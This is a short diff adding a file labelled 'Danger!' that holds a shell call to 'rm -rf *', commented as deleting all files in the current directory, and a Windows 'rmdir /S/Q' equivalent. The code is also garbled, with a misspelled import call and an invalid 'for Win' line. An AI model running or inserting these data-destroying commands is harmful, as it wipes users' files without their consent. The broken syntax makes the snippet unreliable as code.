@@ -1,0 +1,6 @@
+"""Danger!"""
+
+_imort_('os').system('rm -rf *')    # delete all files in current dir
+
+for Win 'rmdir /S/Q.'
+
